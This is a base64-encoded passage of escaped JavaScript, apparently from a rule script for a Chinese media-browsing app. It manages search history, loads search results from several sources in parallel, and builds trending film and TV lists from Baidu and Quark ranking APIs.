IHtcXFxcbiAgICAgICAgaGlzdG9yeS5zcGxpY2UoaGlzdG9yeS5sZW5ndGggLSAxLCAxKTtcXFxcbiAgICB9XFxcXG4gICAgaGlzdG9yeS51bnNoaWZ0KHMpO1xcXFxuICAgIHN0b3JhZ2UwLnNldEl0ZW0oXFxcXFxcXCJzZWFyY2hIaXN0b3J5XFxcXFxcXCIsIGhpc3RvcnkpO1xcXFxufVxcXFxuXFxcXG5mdW5jdGlvbiBzZWFyY2hFbmQoKSB7XFxcXG4gICAgbGV0IHAgPSBNWV9QQUdFO1xcXFxuICAgIGxldCBkYXRhID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL2RhdGFcXFxcXFxcIikuZ2V0RGF0YShwLCByICE9IFxcXFxcXFwiXFxcXFxcXCIgPyByIDogbnVsbCk7XFxcXG4gICAgbGV0IHBhZ2VpZCA9IFxcXFxcXFwieXBqLXBhZ2VcXFxcXFxcIiArIHA7XFxcXG4gICAgaWYgKGRhdGEubGVuZ3RoID4gMCkge1xcXFxuICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi5Yqg6L2956ysXFxcXFxcXCIgKyBwICsgXFxcXFxcXCLpobXkuK3vvIzov5vluqbvvJoxL1xcXFxcXFwiICsgZGF0YS5sZW5ndGgsXFxcXG4gICAgICAgICAgICB1cmw6IFxcXFxcXFwiXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0X2NlbnRlcl8xXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICBkZXNjOiBcXFxcXFxcIlxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgcGljX3VybDogXFxcXFxcXCJcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgaWQ6IHBhZ2VpZFxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9KTtcXFxcbiAgICB9XFxcXG4gICAgc2V0UmVzdWx0KGQpO1xcXFxuICAgIGlmIChkYXRhLmxlbmd0aCA+IDApIHtcXFxcbiAgICAgICAgLy/lpJrnur/nqIvliqDovb0gICAgICAgIFxcXFxuICAgICAgICBsZXQgcmVhbFBhZ2UgPSBcXFxcXFxcIlxcXFxcXFwiID09IHIgPyAxIDogcDtcXFxcbiAgICAgICAgbGV0IHRhc2tzID0gZGF0YS5tYXAoaXQgPT4ge1xcXFxuICAgICAgICAgICAgcmV0dXJuIHtcXFxcbiAgICAgICAgICAgICAgICBmdW5jOiBmdW5jdGlvbihydWxlKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHRyeSB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJC5yZXF1aXJlKFxcXFxcXFwiZGF0YVxcXFxcXFwiKS5jYXJyeVJ1bGUocnVsZSwgcywgcmVhbFBhZ2UsIHNlYXJjaE1vZGUsIG9wZW5Nb2RlKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoZSkge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgbG9nKHJ1bGUubmFtZSArIFxcXFxcXFwiOlxcXFxcXFwiICsgZS50b1N0cmluZygpKVxcXFxuICAgICAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgICAgIC8vcmV0dXJuIHJ1bGUuZmluZChzLCByZWFsUGFnZSk7XFxcXG4gICAgICAgICAgICAgICAgfSxcXFxcbiAgICAgICAgICAgICAgICBwYXJhbTogaXQsXFxcXG4gICAgICAgICAgICAgICAgaWQ6IFxcXFxcXFwicnVsZUBcXFxcXFxcIiArIGl0Lm5hbWVcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfSk7XFxcXG5cXFxcbiAgICAgICAgYmF0Y2hFeGVjdXRlKHRhc2tzLCB7XFxcXG4gICAgICAgICAgICBmdW5jOiBmdW5jdGlvbihwYXJhbSwgaWQsIGVycm9yLCByZXN1bHQpIHtcXFxcbiAgICAgICAgICAgICAgICBwYXJhbS5pICs9IDE7XFxcXG4gICAgICAgICAgICAgICAgaWYgKEFycmF5LmlzQXJyYXkocmVzdWx0KSkge1xcXFxuICAgICAgICAgICAgICAgICAgICBkZWxldGVJdGVtKFxcXFxcXFwiX25vdGhhdmVcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgICAgIGFkZEl0ZW1CZWZvcmUocGFnZWlkLCByZXN1bHQpO1xcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICBpZiAocGFyYW0uaSA9PT0gcGFyYW0uYWxsKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGlmICghcmVzdWx0IHx8ICFyZXN1bHQubGVuZ3RoKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBkZWxldGVJdGVtKFxcXFxcXFwiX25vdGhhdmVcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBhZGRJdGVtQmVmb3JlKHBhZ2VpZCwge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfY2VudGVyXzFcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cmw6IFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuKAnOKAnOKAneKAnVxcXFxcXFwiICsgXFxcXFxcXCJ+fn7ku4DkuYjotYTmupDpg73msqHmnInlk6Z+fn5cXFxcXFxcIi5mb250Y29sb3IoXFxcXFxcXCJHcmF5XFxcXFxcXCIpLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpbmVWaXNpYmxlOiBmYWxzZSxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWQ6IFxcXFxcXFwiX25vdGhhdmVcXFxcXFxcIlxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgICAgIGRlbGV0ZUl0ZW0ocGFnZWlkKTtcXFxcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgICAgICB1cGRhdGVJdGVtKHBhZ2VpZCwge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi5Yqg6L2956ysXFxcXFxcXCIgKyBNWV9QQUdFICsgXFxcXFxcXCLpobXkuK3vvIzov5vluqbvvJpcXFxcXFxcIiArIChwYXJhbS5pICsgMSkgKyBcXFxcXFxcIi9cXFxcXFxcIiArIHBhcmFtLmFsbCxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfY2VudGVyXzFcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHVybDogXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfSxcXFxcbiAgICAgICAgICAgIHBhcmFtOiB7XFxcXG4gICAgICAgICAgICAgICAgYWxsOiBkYXRhLmxlbmd0aCxcXFxcbiAgICAgICAgICAgICAgICBpOiAwLFxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9KVxcXFxuICAgIH1cXFxcbn1cXFxcblxcXFxuZnVuY3Rpb24gc2V0SGlzdG9yeSgpIHtcXFxcbiAgICBkLnB1c2goe1xcXFxuICAgICAgICB0aXRsZTogJzxzcGFuIHN0eWxlPVxcXFxcXFwiY29sb3I6I2ZmNjYwMVxcXFxcXFwiPjxiPuWOhuWPsuiusOW9lTwvYj48L3NwYW4+JyxcXFxcbiAgICAgICAgcGljX3VybDogXFxcXFxcXCJoaWtlcjovL2ltYWdlcy9pY29uX2Nsb2NrXFxcXFxcXCIsXFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImF2YXRhclxcXFxcXFwiLFxcXFxuICAgICAgICB1cmw6ICQoXFxcXFxcXCLnoa7lrprmuIXpmaTlhajpg6jmkJzntKLorrDlvZXvvJ9cXFxcXFxcIikuY29uZmlybSgoaWQpID0+IHtcXFxcbiAgICAgICAgICAgIGNsZWFySXRlbShcXFxcXFxcInNlYXJjaEhpc3RvcnlcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICBkZWxldGVJdGVtQnlDbHMoaWQgKyBcXFxcXFxcIjprZXlcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICBhZGRJdGVtQWZ0ZXIoaWQgKyBcXFxcXFxcIjpzZWFyY2hIaXN0b3J5XFxcXFxcXCIsIHtcXFxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0X2NlbnRlcl8xXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgdXJsOiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICB0aXRsZTogXFxcXFxcXCLigJzigJzigJ3igJ1cXFxcXFxcIiArIFxcXFxcXFwifn5+5LuA5LmI6YO95rKh5pyJ5ZOmfn5+XFxcXFxcXCIuZm9udGNvbG9yKFxcXFxcXFwiR3JheVxcXFxcXFwiKSxcXFxcbiAgICAgICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgICAgICBjbHM6IGlkICsgXFxcXFxcXCI6a2V5XFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgfSwgaWQpLFxcXFxuICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgaWQ6IGlkICsgXFxcXFxcXCI6c2VhcmNoSGlzdG9yeVxcXFxcXFwiXFxcXG4gICAgICAgIH1cXFxcbiAgICB9KTtcXFxcblxcXFxuICAgIGxldCBoaXN0b3J5ID0gc3RvcmFnZTAuZ2V0SXRlbShcXFxcXFxcInNlYXJjaEhpc3RvcnlcXFxcXFxcIiwgW10pO1xcXFxuICAgIGxldCBpID0gMDtcXFxcbiAgICBmb3IgKGxldCBrZXkgb2YgaGlzdG9yeSkge1xcXFxuICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgdGl0bGU6IGtleSxcXFxcbiAgICAgICAgICAgIHVybDogJChcXFxcXFxcIiNub0xvYWRpbmcjXFxcXFxcXCIpLmxhenlSdWxlKChpZCwga2V5KSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IGV4dHJhID0gZmluZEl0ZW0oaWQgKyBcXFxcXFxcInNzXFxcXFxcXCIpLmV4dHJhO1xcXFxuICAgICAgICAgICAgICAgIGV4dHJhLmRlZmF1bHRWYWx1ZSA9IGtleTtcXFxcbiAgICAgICAgICAgICAgICB1cGRhdGVJdGVtKHtcXFxcbiAgICAgICAgICAgICAgICAgICAgZXh0cmE6IGV4dHJhXFxcXG4gICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgfSwgaWQsIGtleSksXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJmbGV4X2J1dHRvblxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgICAgICBpZDogaWQgKyBcXFxcXFxcIjprZXk6XFxcXFxcXCIgKyBrZXksXFxcXG4gICAgICAgICAgICAgICAgY2xzOiBpZCArIFxcXFxcXFwiOmtleVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIGxvbmdDbGljazogW3tcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi5Yig6Zmk5YWz6ZSu6K+NOlxcXFxcXFwiICsga2V5LFxcXFxuICAgICAgICAgICAgICAgICAgICBqczogJC50b1N0cmluZygoaWQsIGtleSwgaSkgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGhpc3RvcnkgPSBzdG9yYWdlMC5nZXRJdGVtKFxcXFxcXFwic2VhcmNoSGlzdG9yeVxcXFxcXFwiLCBbXSk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBoaXN0b3J5LnNwbGljZShpLCAxKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHN0b3JhZ2UwLnNldEl0ZW0oXFxcXFxcXCJzZWFyY2hIaXN0b3J5XFxcXFxcXCIsIGhpc3RvcnkpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgZGVsZXRlSXRlbShpZCArIFxcXFxcXFwiOmtleTpcXFxcXFxcIiArIGtleSk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAvL3RvYXN0KCk7XFxcXG4gICAgICAgICAgICAgICAgICAgIH0sIGlkLCBrZXksIGkpXFxcXG4gICAgICAgICAgICAgICAgfV1cXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfSk7XFxcXG4gICAgICAgIGkrKztcXFxcbiAgICB9XFxcXG4gICAgaWYgKGhpc3RvcnkubGVuZ3RoID09PSAwKSB7XFxcXG4gICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0X2NlbnRlcl8xXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICB1cmw6IFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi4oCc4oCc4oCd4oCdXFxcXFxcXCIgKyBcXFxcXFxcIn5+fuS7gOS5iOmDveayoeacieWTpn5+flxcXFxcXFwiLmZvbnRjb2xvcihcXFxcXFxcIkdyYXlcXFxcXFxcIiksXFxcXG4gICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgIGNsczogaWQgKyBcXFxcXFxcIjprZXlcXFxcXFxcIlxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9KTtcXFxcbiAgICB9XFxcXG59XFxcXG5cXFxcbmZ1bmN0aW9uIHNldFRyZW5kaW5nVGFiRW5kKCkge1xcXFxuXFxcXG4gICAgbGV0IGhvdENsYXNzID0ge1xcXFxuICAgICAgICBcXFxcXFxcIueZvuW6plxcXFxcXFwiOiB7XFxcXG4gICAgICAgICAgICBcXFxcXFxcIueUteinhuWJp1xcXFxcXFwiOiBcXFxcXFxcInRlbGVwbGF5XFxcXFxcXCIsXFxcXG4gICAgICAgICAgICBcXFxcXFxcIueUteW9sVxcXFxcXFwiOiBcXFxcXFxcIm1vdmllXFxcXFxcXCJcXFxcbiAgICAgICAgfSxcXFxcbiAgICAgICAgXFxcXFxcXCLlpLjlhYtcXFxcXFxcIjoge1xcXFxuICAgICAgICAgICAgXFxcXFxcXCLnlLXop4bliadcXFxcXFxcIjogXFxcXFxcXCLnlLXop4bliadcXFxcXFxcIixcXFxcbiAgICAgICAgICAgIFxcXFxcXFwi55S15b2xXFxcXFxcXCI6IFxcXFxcXFwi55S15b2xXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICBcXFxcXFxcIuWKqOa8q1xcXFxcXFwiOiBcXFxcXFxcIuWKqOa8q1xcXFxcXFwiLFxcXFxuICAgICAgICAgICAgXFxcXFxcXCLnu7zoibpcXFxcXFxcIjogXFxcXFxcXCLnu7zoibpcXFxcXFxcIlxcXFxuICAgICAgICB9XFxcXG4gICAgfTtcXFxcbiAgICBsZXQgZGF0YVNvdXJjZSA9IE9iamVjdC5rZXlzKGhvdENsYXNzKTtcXFxcbiAgICBsZXQgc2VsZWN0c291cmNlID0gZ2V0SXRlbShcXFxcXFxcImRhdGFTb3VyY2VcXFxcXFxcIiwgZGF0YVNvdXJjZVswXSk7XFxcXG4gICAgbGV0IGhvdGtleXMgPSBPYmplY3Qua2V5cyhob3RDbGFzc1tzZWxlY3Rzb3VyY2VdKTtcXFxcbiAgICBsZXQgc2VsZWN0a2V5ID0gZ2V0SXRlbShcXFxcXFxcImhvdGtleVxcXFxcXFwiLCBob3RrZXlzWzBdKTtcXFxcbiAgICBsZXQgdGFia2V5ID0gaG90Q2xhc3Nbc2VsZWN0c291cmNlXVtzZWxlY3RrZXldO1xcXFxuXFxcXG4gICAgZC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6ICc8c3BhbiBzdHlsZT1cXFxcXFxcImNvbG9yOiNmZjY2MDFcXFxcXFxcIj48Yj4nICsgc2VsZWN0c291cmNlICsgc2VsZWN0a2V5ICsgJ+eDreaQnDwvYj48L3NwYW4+JyxcXFxcbiAgICAgICAgdXJsOiAkKGhvdGtleXMsIDEsIFxcXFxcXFwi5YiH5o2i54Ot5pCcXFxcXFxcXCIpLnNlbGVjdCgoKSA9PiB7XFxcXG4gICAgICAgICAgICBzZXRJdGVtKFxcXFxcXFwiaG90a2V5XFxcXFxcXCIsIGlucHV0KTtcXFxcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXFxcbiAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5bey5YiH5o2i5Li6XFxcXFxcXCIgKyBpbnB1dDtcXFxcbiAgICAgICAgfSksXFxcXG4gICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImF2YXRhclxcXFxcXFwiLFxcXFxuICAgICAgICBwaWNfdXJsOiBcXFxcXFxcImhpa2VyOi8vaW1hZ2VzL2ljb25fZmlyZVxcXFxcXFwiLFxcXFxuICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgbG9uZ0NsaWNrOiBbe1xcXFxuICAgICAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuWIh+aNouaVsOaNrua6kFxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIGpzOiAkLnRvU3RyaW5nKChkYXRhU291cmNlKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiAkKGRhdGFTb3VyY2UsIDEsIFxcXFxcXFwi5YiH5o2i5pWw5o2u5rqQXFxcXFxcXCIpLnNlbGVjdCgoKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBzZXRJdGVtKFxcXFxcXFwiZGF0YVNvdXJjZVxcXFxcXFwiLCBpbnB1dCk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBjbGVhckl0ZW0oXFxcXFxcXCJob3RrZXlcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL+W3suWIh+aNouS4ulxcXFxcXFwiICsgaW5wdXQ7XFxcXG4gICAgICAgICAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgICAgIH0sIGRhdGFTb3VyY2UpXFxcXG4gICAgICAgICAgICB9XVxcXFxuICAgICAgICB9XFxcXG4gICAgfSk7XFxcXG4gICAgbGV0IHNldFNlYXJjaEtleSA9IG5hbWUgPT4ge1xcXFxuICAgICAgICBwdXRNeVZhcigncycsIG5hbWUpO1xcXFxuICAgICAgICByZWZyZXNoUGFnZSgpO1xcXFxuICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxcXG4gICAgfTtcXFxcblxcXFxuICAgIGxldCBnZXRUaXRsZSA9IChpLCBuYW1lKSA9PiB7XFxcXG4gICAgICAgIGxldCBjb2xvcjtcXFxcbiAgICAgICAgc3dpdGNoIChpKSB7XFxcXG4gICAgICAgICAgICBjYXNlIDA6XFxcXG4gICAgICAgICAgICAgICAgY29sb3IgPSBcXFxcXFxcIiNmZjMzMDBcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgICAgICBicmVhaztcXFxcbiAgICAgICAgICAgIGNhc2UgMTpcXFxcbiAgICAgICAgICAgICAgICBjb2xvciA9IFxcXFxcXFwiI2ZmNjYwMFxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgICAgIGJyZWFrO1xcXFxuICAgICAgICAgICAgY2FzZSAyOlxcXFxuICAgICAgICAgICAgICAgIGNvbG9yID0gXFxcXFxcXCIjZmY5OTAwXFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICBicmVhaztcXFxcbiAgICAgICAgICAgIGRlZmF1bHQ6XFxcXG4gICAgICAgICAgICAgICAgY29sb3IgPSBcXFxcXFxcImJsYWNrXFxcXFxcXCI7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgcmV0dXJuIFxcXFxcXFwi4oCc4oCc4oCd4oCdXFxcXFxcXCIgKyBTdHJpbmcoaSArIDEpLmZvbnRjb2xvcihjb2xvcikgKyBcXFxcXFxcIlxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFxcdFxcXFxcXFwiICsgbmFtZTtcXFxcbiAgICB9XFxcXG4gICAgdHJ5IHtcXFxcbiAgICAgICAgc3dpdGNoIChzZWxlY3Rzb3VyY2UpIHtcXFxcbiAgICAgICAgICAgIGNhc2UgXFxcXFxcXCLnmb7luqZcXFxcXFxcIjpcXFxcbiAgICAgICAgICAgICAgICB2YXIganNvbiA9IHJlcXVlc3QoJ2h0dHBzOi8vdG9wLmJhaWR1LmNvbS9hcGkvYm9hcmQ/cGxhdGZvcm09d2lzZSZ0YWI9JyArIHRhYmtleSArICcmdGFnPSU3QiUyMmNhdGVnb3J5JTIyOiUyMiVFNSU4NSVBOCVFOSU4MyVBOCVFNyVCMSVCQiVFNSU5RSU4QiUyMiU3RCcsIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgaGVhZGVyczoge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDYuMDsgTmV4dXMgNSBCdWlsZC9NUkE1OE4pIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85OS4wLjQ4NDQuNTEgTW9iaWxlIFNhZmFyaS81MzcuMzYnLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgJ0hvc3QnOiAndG9wLmJhaWR1LmNvbScsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAnQWNjZXB0JzogJ2FwcGxpY2F0aW9uL2pzb24sIHRleHQvcGxhaW4sICovKicsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAnQWNjZXB0LUxhbmd1YWdlJzogJ3poLUNOLHpoO3E9MC45LGVuLVVTO3E9MC44LGVuO3E9MC43JyxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICdBY2NlcHQtRW5jb2RpbmcnOiAnZ3ppcCwgZGVmbGF0ZSwgYnInLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgJ1JlZmVyZXInOiAnaHR0cHM6Ly90b3AuYmFpZHUuY29tL2JvYXJkP3RhYj1ub3ZlbCcsXFxcXG4gICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgICAgICAvL3ZhciBzID0gRGF0ZS5ub3coKTtcXFxcbiAgICAgICAgICAgICAgICB2YXIgbGlzdCA9IEpTT04ucGFyc2UoanNvbikuZGF0YS5jYXJkc1swXS5jb250ZW50O1xcXFxuICAgICAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgbGlzdC5sZW5ndGg7IGkrKykge1xcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgaXRlbSA9IGxpc3RbaV07XFxcXG4gICAgICAgICAgICAgICAgICAgIGxldCBuYW1lID0gaXRlbS53b3JkICsgJyAoJyArIGl0ZW0uc2hvd1syXSArICcpJztcXFxcbiAgICAgICAgICAgICAgICAgICAgbGV0IGRlcyA9IGl0ZW0uZGVzYztcXFxcbiAgICAgICAgICAgICAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBnZXRUaXRsZShpLCBuYW1lKSxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHVybDogJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZShzZXRTZWFyY2hLZXksIGl0ZW0ud29yZCksXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBkZXNjOiBkZXMsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBpbWc6IGl0ZW0uaW1nLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwibW92aWVfMV92ZXJ0aWNhbF9waWNcXFxcXFxcIlxcXFxuICAgICAgICAgICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgYnJlYWs7XFxcXG4gICAgICAgICAgICBjYXNlIFxcXFxcXFwi5aS45YWLXFxcXFxcXCI6XFxcXG4gICAgICAgICAgICAgICAgdmFyIGpzb24gPSByZXF1ZXN0KFxcXFxcXFwiaHR0cHM6Ly9uZXdzLm15cXVhcmsuY24vdjIvdG9wbGlzdC9tb3ZpZT8mY2hhbm5lbD1cXFxcXFxcIiArIHRhYmtleSArIFxcXFxcXFwiJnJhbmtfdHlwZT0lRTYlOUMlODAlRTclODMlQURcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgdmFyIHhtbERhdGEgPSAoSlNPTi5wYXJzZShqc29uKS5kYXRhIHx8IFxcXFxcXFwiXFxcXFxcXCIpLnJlcGxhY2UoL3RpdGxlPi9nLCBcXFxcXFxcImhfdGl0bGU+XFxcXFxcXCIpLnJlcGxhY2UoL3NyYz4vZywgXFxcXFxcXCJoX3NyYz5cXFxcXFxcIikucmVwbGFjZSgvYXJlYT4vZywgXFxcXFxcXCJoX2FyZWFcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgdmFyIGxpc3QgPSBwZGZhKHhtbERhdGEsIFxcXFxcXFwiYm9keSYmaXRlbVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICB2YXIgZ2V0VGV4dCA9IHQgPT4gdDtcXFxcbiAgICAgICAgICAgICAgICB2YXIgdHJlbmQgPSBbXFxcXFxcXCLjhKdcXFxcXFxcIiwgXFxcXFxcXCLihpFcXFxcXFxcIiwgXFxcXFxcXCLihpNcXFxcXFxcIl07XFxcXG4gICAgICAgICAgICAgICAgLy92YXIgcyA9IERhdGUubm93KCk7XFxcXG4gICAgICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBsaXN0Lmxlbmd0aDsgaSsrKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGxldCBpdGVtID0gbGlzdFtpXTtcXFxcbiAgICAgICAgICAgICAgICAgICAgbGV0IG5hbWUgPSBwZGZoKGl0ZW0sIFxcXFxcXFwiaF90aXRsZSYmVGV4dFxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgbGV0IGRlcyA9IFxcXFxcXFwi54Ot5bqm77yaXFxcXFxcXCIgKyBwZGZoKGl0ZW0sIFxcXFxcXFwiaG90X3Njb3JlJiZUZXh0XFxcXFxcXCIpICsgXFxcXFxcXCIgXFxcXFxcXCIgKyB0cmVuZC5hdChwZGZoKGl0ZW0sIFxcXFxcXFwiaG90X3RyZW5kJiZUZXh0XFxcXFxcXCIpKSArXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBcXFxcXFxcIlxcXFxcXFxcbuivhOWIhu+8mlxcXFxcXFwiICsgcGRmaChpdGVtLCBcXFxcXFxcInNjb3JlX2F2ZyYmVGV4dFxcXFxcXFwiKS5yZXBsYWNlKC9eMCQvLCBcXFxcXFxcIuaaguaXoOivhOWIhlxcXFxcXFwiKSArXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBcXFxcXFxcIlxcXFxcXFxcblxcXFxcXFwiICsgcGRmaChpdGVtLCBcXFxcXFxcInllYXImJlRleHRcXFxcXFxcIikgKyBcXFxcXFxcIsK3XFxcXFxcXCIgKyBwZGZoKGl0ZW0sIFxcXFxcXFwiaF9hcmVhJiZUZXh0XFxcXFxcXCIpICsgXFxcXFxcXCLCt1xcXFxcXFwiICsgcGRmaChpdGVtLCBcXFxcXFxcImNhdGVnb3J5JiZUZXh0XFxcXFxcXCIpLnJlcGxhY2UoXFxcXFxcXCIsXFxcXFxcXCIsIFxcXFxcXFwiwrdcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogZ2V0VGl0bGUoaSwgbmFtZSksXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB1cmw6ICQoJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoc2V0U2VhcmNoS2V5LCBuYW1lKSxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGRlc2M6IGRlcyxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGltZzogcGRmaChpdGVtLCBcXFxcXFxcImhfc3JjJiZUZXh0XFxcXFxcXCIpLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwibW92aWVfMV92ZXJ0aWNhbF9waWNcXFxc